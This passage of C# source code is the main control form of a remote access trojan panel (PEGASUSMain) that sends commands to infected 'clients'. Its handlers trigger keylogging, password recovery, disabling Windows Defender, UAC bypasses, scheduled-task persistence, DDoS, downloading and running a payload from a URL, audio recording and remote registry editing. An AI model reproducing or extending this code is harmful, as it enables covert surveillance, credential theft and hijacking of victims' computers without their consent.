                            Text = "chat:" + client.ID,
                            F = this,
                            ParentClient = client
                        };
                        chat.Show();
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        /// <summary>
        /// The VisteWebsiteToolStripMenuItem1_Click.
        /// </summary>
        /// <param name="sender">The sender<see cref="object"/>.</param>
        /// <param name="e">The e<see cref="EventArgs"/>.</param>
        private void VisteWebsiteToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            try
            {
                var url = InputDialog.Show("Visit URL");
                if (string.IsNullOrEmpty(url)) return;

                var packet = new MsgPack();
                packet.ForcePathObject("Pac_ket").AsString = "visitURL";
                packet.ForcePathObject("URL").AsString = url;

                var msgpack = new MsgPack();
                msgpack.ForcePathObject("Pac_ket").AsString = "plu_gin";
                msgpack.ForcePathObject("Dll").AsString = GetHash.GetChecksum(@"Plugins\Ex.dll");
                msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());

                foreach (var client in GetSelectedClients())
                {
                    client.LV.ForeColor = Color.FromArgb(191, 38, 33);
                    ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        /// <summary>
        /// The ChangeWallpaperToolStripMenuItem1_Click.
        /// </summary>
        /// <param name="sender">The sender<see cref="object"/>.</param>
        /// <param name="e">The e<see cref="EventArgs"/>.</param>
        private void ChangeWallpaperToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            try
            {
                if (listView1.SelectedItems.Count > 0)
                    using (var openFileDialog = new OpenFileDialog())
                    {
                        openFileDialog.Filter = "All Graphics Types|*.bmp;*.jpg;*.jpeg;*.png";
                        if (openFileDialog.ShowDialog() == DialogResult.OK)
                        {
                            var packet = new MsgPack();
                            packet.ForcePathObject("Pac_ket").AsString = "wallpaper";
                            packet.ForcePathObject("Image").SetAsBytes(File.ReadAllBytes(openFileDialog.FileName));
                            packet.ForcePathObject("Exe").AsString = Path.GetExtension(openFileDialog.FileName);

                            var msgpack = new MsgPack();
                            msgpack.ForcePathObject("Pac_ket").AsString = "plu_gin";
                            msgpack.ForcePathObject("Dll").AsString = GetHash.GetChecksum(@"Plugins\Ex.dll");
                            msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());

                            foreach (var client in GetSelectedClients())
                            {
                                client.LV.ForeColor = Color.FromArgb(191, 38, 33);
                                ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                            }
                        }
                    }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        /// <summary>
        /// The KeyloggerToolStripMenuItem1_Click.
        /// </summary>
        /// <param name="sender">The sender<see cref="object"/>.</param>
        /// <param name="e">The e<see cref="EventArgs"/>.</param>
        private void KeyloggerToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            try
            {
                var msgpack = new MsgPack();
                msgpack.ForcePathObject("Pac_ket").AsString = "plu_gin";
                msgpack.ForcePathObject("Dll").AsString = GetHash.GetChecksum(@"Plugins\LG.dll");

                foreach (var client in GetSelectedClients())
                {
                    var KL = (FormKeylogger)Application.OpenForms["keyLogger:" + client.ID];
                    if (KL == null)
                    {
                        KL = new FormKeylogger
                        {
                            Name = "keyLogger:" + client.ID,
                            Text = "keyLogger:" + client.ID,
                            F = this,
                            FullPath = Path.Combine(Application.StartupPath, "ClientsFolder", client.ID, "Keylogger")
                        };
                        KL.Show();
                        client.LV.ForeColor = Color.FromArgb(191, 38, 33);
                        ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        /// <summary>
        /// The StartToolStripMenuItem1_Click.
        /// </summary>
        /// <param name="sender">The sender<see cref="object"/>.</param>
        /// <param name="e">The e<see cref="EventArgs"/>.</param>
        private void StartToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            try
            {
                var title = InputDialog.Show("Alert when process is active,put input name!");
                if (string.IsNullOrEmpty(title)) return;

                lock (Settings.LockReportWindowClients)
                {
                    Settings.ReportWindowClients.Clear();
                    Settings.ReportWindowClients = new List<Clients>();
                }

                Settings.ReportWindow = true;

                var packet = new MsgPack();
                packet.ForcePathObject("Pac_ket").AsString = "reportWindow";
                packet.ForcePathObject("Option").AsString = "run";
                packet.ForcePathObject("Title").AsString = title;

                var msgpack = new MsgPack();
                msgpack.ForcePathObject("Pac_ket").AsString = "plu_gin";
                msgpack.ForcePathObject("Dll").AsString = GetHash.GetChecksum(@"Plugins\OPT.dll");
                msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());

                foreach (var client in GetSelectedClients())
                {
                    client.LV.ForeColor = Color.FromArgb(191, 38, 33);
                    ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        /// <summary>
        /// The StopToolStripMenuItem2_Click.
        /// </summary>
        /// <param name="sender">The sender<see cref="object"/>.</param>
        /// <param name="e">The e<see cref="EventArgs"/>.</param>
        private void StopToolStripMenuItem2_Click(object sender, EventArgs e)
        {
            try
            {
                Settings.ReportWindow = false;
                var packet = new MsgPack();
                packet.ForcePathObject("Pac_ket").AsString = "reportWindow";
                packet.ForcePathObject("Option").AsString = "stop";
                lock (Settings.LockReportWindowClients)
                {
                    foreach (var clients in Settings.ReportWindowClients)
                        ThreadPool.QueueUserWorkItem(clients.Send, packet.Encode2Bytes());
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        /// <summary>
        /// The StopToolStripMenuItem1_Click.
        /// </summary>
        /// <param name="sender">The sender<see cref="object"/>.</param>
        /// <param name="e">The e<see cref="EventArgs"/>.</param>
        private void StopToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            try
            {
                var packet = new MsgPack();
                packet.ForcePathObject("Pac_ket").AsString = "close";

                var msgpack = new MsgPack();
                msgpack.ForcePathObject("Pac_ket").AsString = "plu_gin";
                msgpack.ForcePathObject("Dll").AsString = GetHash.GetChecksum(@"Plugins\OPT.dll");
                msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());

                foreach (var client in GetSelectedClients())
                {
                    client.LV.ForeColor = Color.FromArgb(191, 38, 33);
                    ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        /// <summary>
        /// The RestartToolStripMenuItem1_Click.
        /// </summary>
        /// <param name="sender">The sender<see cref="object"/>.</param>
        /// <param name="e">The e<see cref="EventArgs"/>.</param>
        private void RestartToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            try
            {
                var packet = new MsgPack();
                packet.ForcePathObject("Pac_ket").AsString = "restart";

                var msgpack = new MsgPack();
                msgpack.ForcePathObject("Pac_ket").AsString = "plu_gin";
                msgpack.ForcePathObject("Dll").AsString = GetHash.GetChecksum(@"Plugins\OPT.dll");
                msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());

                foreach (var client in GetSelectedClients())
                {
                    client.LV.ForeColor = Color.FromArgb(191, 38, 33);
                    ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        /// <summary>
        /// The UpdateToolStripMenuItem_Click.
        /// </summary>
        /// <param name="sender">The sender<see cref="object"/>.</param>
        /// <param name="e">The e<see cref="EventArgs"/>.</param>
        private void UpdateToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                using (var openFileDialog = new OpenFileDialog())
                {
                    if (openFileDialog.ShowDialog() == DialogResult.OK)
                    {
                        var packet = new MsgPack();
                        packet.ForcePathObject("Pac_ket").AsString = "sendFile";
                        packet.ForcePathObject("File")
                            .SetAsBytes(Zip.Compress(File.ReadAllBytes(openFileDialog.FileName)));
                        packet.ForcePathObject("FileName").AsString = Path.GetFileName(openFileDialog.FileName);
                        packet.ForcePathObject("Update").AsString = "true";

                        var msgpack = new MsgPack();
                        msgpack.ForcePathObject("Pac_ket").AsString = "plu_gin";
                        msgpack.ForcePathObject("Dll").AsString = GetHash.GetChecksum(@"Plugins\SF.dll");
                        msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());

                        foreach (var client in GetSelectedClients())
                        {
                            client.LV.ForeColor = Color.FromArgb(191, 38, 33);
                            ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        /// <summary>
        /// The UninstallToolStripMenuItem_Click.
        /// </summary>
        /// <param name="sender">The sender<see cref="object"/>.</param>
        /// <param name="e">The e<see cref="EventArgs"/>.</param>
        private void UninstallToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                var packet = new MsgPack();
                packet.ForcePathObject("Pac_ket").AsString = "uninstall";

                var msgpack = new MsgPack();
                msgpack.ForcePathObject("Pac_ket").AsString = "plu_gin";
                msgpack.ForcePathObject("Dll").AsString = GetHash.GetChecksum(@"Plugins\OPT.dll");
                msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());

                foreach (var client in GetSelectedClients())
                {
                    client.LV.ForeColor = Color.FromArgb(191, 38, 33);
                    ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        /// <summary>
        /// The ClientFolderToolStripMenuItem_Click.
        /// </summary>
        /// <param name="sender">The sender<see cref="object"/>.</param>
        /// <param name="e">The e<see cref="EventArgs"/>.</param>
        private void ClientFolderToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                var clients = GetSelectedClients();
                if (clients.Length == 0)
                {
                    Process.Start(Application.StartupPath);
                    return;
                }

                foreach (var client in clients)
                {
                    var fullPath = Path.Combine(Application.StartupPath, "ClientsFolder\\" + client.ID);
                    if (Directory.Exists(fullPath)) Process.Start(fullPath);
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        /// <summary>
        /// The RebootToolStripMenuItem_Click.
        /// </summary>
        /// <param name="sender">The sender<see cref="object"/>.</param>
        /// <param name="e">The e<see cref="EventArgs"/>.</param>
        private void RebootToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                var packet = new MsgPack();
                packet.ForcePathObject("Pac_ket").AsString = "pcOptions";
                packet.ForcePathObject("Option").AsString = "restart";

                var msgpack = new MsgPack();
                msgpack.ForcePathObject("Pac_ket").AsString = "plu_gin";
                msgpack.ForcePathObject("Dll").AsString = GetHash.GetChecksum(@"Plugins\OPT.dll");
                msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());

                foreach (var client in GetSelectedClients())
                {
                    client.LV.ForeColor = Color.FromArgb(191, 38, 33);
                    ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        /// <summary>
        /// The ShutDownToolStripMenuItem_Click.
        /// </summary>
        /// <param name="sender">The sender<see cref="object"/>.</param>
        /// <param name="e">The e<see cref="EventArgs"/>.</param>
        private void ShutDownToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                var packet = new MsgPack();
                packet.ForcePathObject("Pac_ket").AsString = "pcOptions";
                packet.ForcePathObject("Option").AsString = "shutdown";

                var msgpack = new MsgPack();
                msgpack.ForcePathObject("Pac_ket").AsString = "plu_gin";
                msgpack.ForcePathObject("Dll").AsString = GetHash.GetChecksum(@"Plugins\OPT.dll");
                msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());

                foreach (var client in GetSelectedClients())
                {
                    client.LV.ForeColor = Color.FromArgb(191, 38, 33);
                    ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        /// <summary>
        /// The LogoutToolStripMenuItem_Click.
        /// </summary>
        /// <param name="sender">The sender<see cref="object"/>.</param>
        /// <param name="e">The e<see cref="EventArgs"/>.</param>
        private void LogoutToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                var packet = new MsgPack();
                packet.ForcePathObject("Pac_ket").AsString = "pcOptions";
                packet.ForcePathObject("Option").AsString = "logoff";

                var msgpack = new MsgPack();
                msgpack.ForcePathObject("Pac_ket").AsString = "plu_gin";
                msgpack.ForcePathObject("Dll").AsString = GetHash.GetChecksum(@"Plugins\OPT.dll");
                msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());

                foreach (var client in GetSelectedClients())
                {
                    client.LV.ForeColor = Color.FromArgb(191, 38, 33);
                    ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        /// <summary>
        /// The BlockToolStripMenuItem_Click.
        /// </summary>
        /// <param name="sender">The sender<see cref="object"/>.</param>
        /// <param name="e">The e<see cref="EventArgs"/>.</param>
        private void BlockToolStripMenuItem_Click(object sender, EventArgs e)
        {
            using (var form = new FormBlockClients())
            {
                form.ShowDialog();
            }
        }

        /// <summary>
        /// The ExitToolStripMenuItem_Click.
        /// </summary>
        /// <param name="sender">The sender<see cref="object"/>.</param>
        /// <param name="e">The e<see cref="EventArgs"/>.</param>
        private void ExitToolStripMenuItem_Click(object sender, EventArgs e)
        {
            notifyIcon1.Dispose();
            Environment.Exit(0);
        }

        /// <summary>
        /// The FileSearchToolStripMenuItem_Click.
        /// </summary>
        /// <param name="sender">The sender<see cref="object"/>.</param>
        /// <param name="e">The e<see cref="EventArgs"/>.</param>
        private void FileSearchToolStripMenuItem_Click(object sender, EventArgs e)
        {
            using (var form = new FormFileSearcher())
            {
                if (form.ShowDialog() == DialogResult.OK)
                    if (listView1.SelectedItems.Count > 0)
                    {
                        var packet = new MsgPack();
                        packet.ForcePathObject("Pac_ket").AsString = "fileSearcher";
                        packet.ForcePathObject("SizeLimit").AsInteger = (long)form.numericUpDown1.Value * 1000 * 1000;
                        packet.ForcePathObject("Extensions").AsString = form.txtExtnsions.Text;

                        var msgpack = new MsgPack();
                        msgpack.ForcePathObject("Pac_ket").AsString = "plu_gin";
                        msgpack.ForcePathObject("Dll").AsString = GetHash.GetChecksum(@"Plugins\FS.dll");
                        msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());

                        foreach (var client in GetSelectedClients())
                        {
                            client.LV.ForeColor = Color.Red;
                            ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                        }
                    }
            }
        }

        /// <summary>
        /// The InformationToolStripMenuItem_Click.
        /// </summary>
        /// <param name="sender">The sender<see cref="object"/>.</param>
        /// <param name="e">The e<see cref="EventArgs"/>.</param>
        private void InformationToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                if (listView1.SelectedItems.Count > 0)
                {
                    var packet = new MsgPack();
                    packet.ForcePathObject("Pac_ket").AsString = "information";

                    var msgpack = new MsgPack();
                    msgpack.ForcePathObject("Pac_ket").AsString = "plu_gin";
                    msgpack.ForcePathObject("Dll").AsString = GetHash.GetChecksum(@"Plugins\IF.dll");
                    msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());

                    foreach (var client in GetSelectedClients())
                    {
                        client.LV.ForeColor = Color.FromArgb(191, 38, 33);
                        ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

#pragma warning disable CS0649 // Field 'PEGASUSMain.formDOS' is never assigned to, and will always have its default value null
        /// <summary>
        /// Defines the formDOS.
        /// </summary>
        private readonly FormDOS formDOS;

#pragma warning restore CS0649 // Field 'PEGASUSMain.formDOS' is never assigned to, and will always have its default value null
        /// <summary>
        /// The dDOSToolStripMenuItem_Click.
        /// </summary>
        /// <param name="sender">The sender<see cref="object"/>.</param>
        /// <param name="e">The e<see cref="EventArgs"/>.</param>
        private void dDOSToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                if (listView1.Items.Count > 0)
                {
                    var packet = new MsgPack();
                    packet.ForcePathObject("Pac_ket").AsString = "dosAdd";

                    var msgpack = new MsgPack();
                    msgpack.ForcePathObject("Pac_ket").AsString = "plu_gin";
                    msgpack.ForcePathObject("Dll").AsString = GetHash.GetChecksum(@"Plugins\ML.dll");
                    msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());

                    foreach (var client in GetSelectedClients())
                    {
                        client.LV.ForeColor = Color.FromArgb(191, 38, 33);
                        ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                    }

                    formDOS.Show();
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        /// <summary>
        /// The EncryptToolStripMenuItem_Click.
        /// </summary>
        /// <param name="sender">The sender<see cref="object"/>.</param>
        /// <param name="e">The e<see cref="EventArgs"/>.</param>
        private void EncryptToolStripMenuItem_Click(object sender, EventArgs e)
        {
        }

        /// <summary>
        /// The DecryptToolStripMenuItem_Click.
        /// </summary>
        /// <param name="sender">The sender<see cref="object"/>.</param>
        /// <param name="e">The e<see cref="EventArgs"/>.</param>
        private void DecryptToolStripMenuItem_Click(object sender, EventArgs e)
        {
        }

        /// <summary>
        /// The DisableWDToolStripMenuItem_Click.
        /// </summary>
        /// <param name="sender">The sender<see cref="object"/>.</param>
        /// <param name="e">The e<see cref="EventArgs"/>.</param>
        private void DisableWDToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count > 0)
                //DialogResult dialogResult = MessageBox.Show(this, "Run this Only as Admin.", "Disable Defender", MessageBoxButtons.YesNo, MessageBoxIcon.Information);
                //if (dialogResult == DialogResult.Yes)
                //{
                try
                {
                    var packet = new MsgPack();
                    packet.ForcePathObject("Pac_ket").AsString = "disableDefedner";

                    var msgpack = new MsgPack();
                    msgpack.ForcePathObject("Pac_ket").AsString = "plu_gin";
                    msgpack.ForcePathObject("Dll").AsString = GetHash.GetChecksum(@"Plugins\Ex.dll");
                    msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());

                    foreach (var client in GetSelectedClients())
                        if (client.LV.SubItems[lv_admin.Index].Text == "Admin")
                        {
                            client.LV.ForeColor = Color.FromArgb(191, 38, 33);
                            ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                        }
                }
                catch (Exception ex)
                {
                    MessageBox.Show(ex.Message);
                }
        }

        /// <summary>
        /// The RecordToolStripMenuItem_Click.
        /// </summary>
        /// <param name="sender">The sender<see cref="object"/>.</param>
        /// <param name="e">The e<see cref="EventArgs"/>.</param>
        private void RecordToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                foreach (var client in GetSelectedClients())
                {
                    var audiorecord = (FormAudio)Application.OpenForms["Audio Recorder:" + client.ID];
                    if (audiorecord == null)
                    {
                        audiorecord = new FormAudio
                        {
                            Name = "Audio Recorder:" + client.ID,
                            Text = "Audio Recorder:" + client.ID,
                            F = this,
                            ParentClient = client,
                            Client = client
                        };
                        audiorecord.Show();
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        /// <summary>
        /// The RunasToolStripMenuItem_Click.
        /// </summary>
        /// <param name="sender">The sender<see cref="object"/>.</param>
        /// <param name="e">The e<see cref="EventArgs"/>.</param>
        private void RunasToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count > 0)
                try
                {
                    var packet = new MsgPack();
                    packet.ForcePathObject("Pac_ket").AsString = "uac";

                    var msgpack = new MsgPack();
                    msgpack.ForcePathObject("Pac_ket").AsString = "plu_gin";
                    msgpack.ForcePathObject("Dll").AsString = GetHash.GetChecksum(@"Plugins\OPT.dll");
                    msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());

                    foreach (var client in GetSelectedClients())
                        if (client.LV.SubItems[lv_admin.Index].Text != "Administrator")
                        {
                            client.LV.ForeColor = Color.FromArgb(191, 38, 33);
                            ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                        }
                }
                catch (Exception ex)
                {
                    MessageBox.Show(ex.Message);
                }
        }

        /// <summary>
        /// The SilentCleanupToolStripMenuItem_Click.
        /// </summary>
        /// <param name="sender">The sender<see cref="object"/>.</param>
        /// <param name="e">The e<see cref="EventArgs"/>.</param>
        private void SilentCleanupToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count > 0)
                try
                {
                    var packet = new MsgPack();
                    packet.ForcePathObject("Pac_ket").AsString = "uacbypass";

                    var msgpack = new MsgPack();
                    msgpack.ForcePathObject("Pac_ket").AsString = "plu_gin";
                    msgpack.ForcePathObject("Dll").AsString = GetHash.GetChecksum(@"Plugins\OPT.dll");
                    msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());

                    foreach (var client in GetSelectedClients())
                        if (client.LV.SubItems[lv_admin.Index].Text != "Administrator")
                            ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                }
                catch (Exception ex)
                {
                    MessageBox.Show(ex.Message);
                }
        }

        /// <summary>
        /// The SchtaskInstallToolStripMenuItem_Click.
        /// </summary>
        /// <param name="sender">The sender<see cref="object"/>.</param>
        /// <param name="e">The e<see cref="EventArgs"/>.</param>
        private void SchtaskInstallToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count > 0)
                try
                {
                    var packet = new MsgPack();
                    packet.ForcePathObject("Pac_ket").AsString = "schtaskinstall";

                    var msgpack = new MsgPack();
                    msgpack.ForcePathObject("Pac_ket").AsString = "plu_gin";
                    msgpack.ForcePathObject("Dll").AsString = GetHash.GetChecksum(@"Plugins\OPT.dll");
                    msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());

                    foreach (var client in GetSelectedClients())
                    {
                        client.LV.ForeColor = Color.FromArgb(191, 38, 33);
                        ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                    }
                }
                catch (Exception ex)
                {
                    MessageBox.Show(ex.Message);
                }
        }

        /// <summary>
        /// The PasswordRecoveryToolStripMenuItem_Click.
        /// </summary>
        /// <param name="sender">The sender<see cref="object"/>.</param>
        /// <param name="e">The e<see cref="EventArgs"/>.</param>
        private void PasswordRecoveryToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                var msgpack = new MsgPack();
                msgpack.ForcePathObject("Pac_ket").AsString = "plu_gin";
                msgpack.ForcePathObject("Dll").AsString = GetHash.GetChecksum(@"Plugins\Rec.dll");

                foreach (var client in GetSelectedClients())
                {
                    client.LV.ForeColor = Color.FromArgb(191, 38, 33);
                    ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                }
                //new HandleLogs().Addmsg("Recovering...", Color.FromArgb(3,130,200));
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        /// <summary>
        /// The FodhelperToolStripMenuItem_Click.
        /// </summary>
        /// <param name="sender">The sender<see cref="object"/>.</param>
        /// <param name="e">The e<see cref="EventArgs"/>.</param>
        private void FodhelperToolStripMenuItem_Click(object sender, EventArgs e)
        {
        }

        /// <summary>
        /// The DisableUACToolStripMenuItem_Click.
        /// </summary>
        /// <param name="sender">The sender<see cref="object"/>.</param>
        /// <param name="e">The e<see cref="EventArgs"/>.</param>
        private void DisableUACToolStripMenuItem_Click(object sender, EventArgs e)
        {
        }

        /// <summary>
        /// The CompMgmtLauncherToolStripMenuItem_Click.
        /// </summary>
        /// <param name="sender">The sender<see cref="object"/>.</param>
        /// <param name="e">The e<see cref="EventArgs"/>.</param>
        private void CompMgmtLauncherToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count > 0)
                try
                {
                    var packet = new MsgPack();
                    packet.ForcePathObject("Pac_ket").AsString = "uacbypass2";

                    var msgpack = new MsgPack();
                    msgpack.ForcePathObject("Pac_ket").AsString = "plu_gin";
                    msgpack.ForcePathObject("Dll").AsString = GetHash.GetChecksum(@"Plugins\OPT.dll");
                    msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());

                    foreach (var client in GetSelectedClients())
                        if (client.LV.SubItems[lv_admin.Index].Text != "Administrator")
                            ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                }
                catch (Exception ex)
                {
                    MessageBox.Show(ex.Message);
                }
        }

        /// <summary>
        /// The DocumentToolStripMenuItem_Click.
        /// </summary>
        /// <param name="sender">The sender<see cref="object"/>.</param>
        /// <param name="e">The e<see cref="EventArgs"/>.</param>
        private void DocumentToolStripMenuItem_Click(object sender, EventArgs e)
        {

            Process.Start("https://www.pantheon.one/category/video-tutorials/"); //skynet
        }

        /// <summary>
        /// The SettingToolStripMenuItem_Click.
        /// </summary>
        /// <param name="sender">The sender<see cref="object"/>.</param>
        /// <param name="e">The e<see cref="EventArgs"/>.</param>
        private void SettingToolStripMenuItem_Click(object sender, EventArgs e)
        {
            using (var formSetting = new FormSetting())
            {
                formSetting.ShowDialog();
            }
        }

        /// <summary>
        /// The SchtaskUninstallToolStripMenuItem_Click.
        /// </summary>
        /// <param name="sender">The sender<see cref="object"/>.</param>
        /// <param name="e">The e<see cref="EventArgs"/>.</param>
        private void SchtaskUninstallToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count > 0)
                try
                {
                    var packet = new MsgPack();
                    packet.ForcePathObject("Pac_ket").AsString = "schtaskuninstall";

                    var msgpack = new MsgPack();
                    msgpack.ForcePathObject("Pac_ket").AsString = "plu_gin";
                    msgpack.ForcePathObject("Dll").AsString = GetHash.GetChecksum(@"Plugins\OPT.dll");
                    msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());

                    foreach (var client in GetSelectedClients())
                    {
                        client.LV.ForeColor = Color.FromArgb(191, 38, 33);
                        ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                    }
                }
                catch (Exception ex)
                {
                    MessageBox.Show(ex.Message);
                }
        }

        /// <summary>
        /// The netstatToolStripMenuItem_Click.
        /// </summary>
        /// <param name="sender">The sender<see cref="object"/>.</param>
        /// <param name="e">The e<see cref="EventArgs"/>.</param>
        private void netstatToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                var msgpack = new MsgPack();
                msgpack.ForcePathObject("Pac_ket").AsString = "plu_gin";
                msgpack.ForcePathObject("Dll").AsString = GetHash.GetChecksum(@"Plugins\Connection.dll");

                foreach (var client in GetSelectedClients())
                {
                    var netstat = (FormNetstat)Application.OpenForms["Netstat:" + client.ID];
                    if (netstat == null)
                    {
                        netstat = new FormNetstat
                        {
                            Name = "Netstat:" + client.ID,
                            Text = "Netstat:" + client.ID,
                            F = this,
                            ParentClient = client
                        };
                        netstat.Show();
                        ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        /// <summary>
        /// The fromUrlToolStripMenuItem_Click.
        /// </summary>
        /// <param name="sender">The sender<see cref="object"/>.</param>
        /// <param name="e">The e<see cref="EventArgs"/>.</param>
        private void fromUrlToolStripMenuItem_Click(object sender, EventArgs e)
        {
            var Msgbox = InputDialog.Show("\nPayload link.\n");
            if (string.IsNullOrEmpty(Msgbox)) return;

            if (listView1.SelectedItems.Count > 0)
                try
                {
                    var packet = new MsgPack();
                    packet.ForcePathObject("Pac_ket").AsString = "downloadFromUrl";
                    packet.ForcePathObject("url").AsString = Msgbox;

                    var msgpack = new MsgPack();
                    msgpack.ForcePathObject("Pac_ket").AsString = "plu_gin";
                    msgpack.ForcePathObject("Dll").AsString = GetHash.GetChecksum(@"Plugins\Ex.dll");
                    msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());

                    foreach (var client in GetSelectedClients())
                        ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                }
                catch (Exception ex)
                {
                    MessageBox.Show(ex.Message);
                }
        }

        /// <summary>
        /// The ConnectTimeout_Tick.
        /// </summary>
        /// <param name="sender">The sender<see cref="object"/>.</param>
        /// <param name="e">The e<see cref="EventArgs"/>.</param>
        private void ConnectTimeout_Tick(object sender, EventArgs e)
        {
            var clients = GetAllClients();
            if (clients.Length > 0)
                foreach (var client in clients)
                    if (Methods.DiffSeconds(client.LastPing, DateTime.Now) > 20)
                        client.Disconnected();
        }

        /// <summary>
        /// The remoteRegeditToolStripMenuItem_Click.
        /// </summary>
        /// <param name="sender">The sender<see cref="object"/>.</param>
        /// <param name="e">The e<see cref="EventArgs"/>.</param>
        private void remoteRegeditToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                var msgpack = new MsgPack();
                msgpack.ForcePathObject("Pac_ket").AsString = "plu_gin";
                msgpack.ForcePathObject("Dll").AsString = GetHash.GetChecksum(@"Plugins\REG.dll");

                foreach (var client in GetSelectedClients())
                {
                    var registryEditor = (FormRegistryEditor)Application.OpenForms["remoteRegedit:" + client.ID];
                    if (registryEditor == null)
                    {
                        registryEditor = new FormRegistryEditor
                        {
                            Name = "remoteRegedit:" + client.ID,
                            Text = "remoteRegedit:" + client.ID,
                            //Client = client,
                            ParentClient = client,
                            F = this
                        };
                        registryEditor.Show();
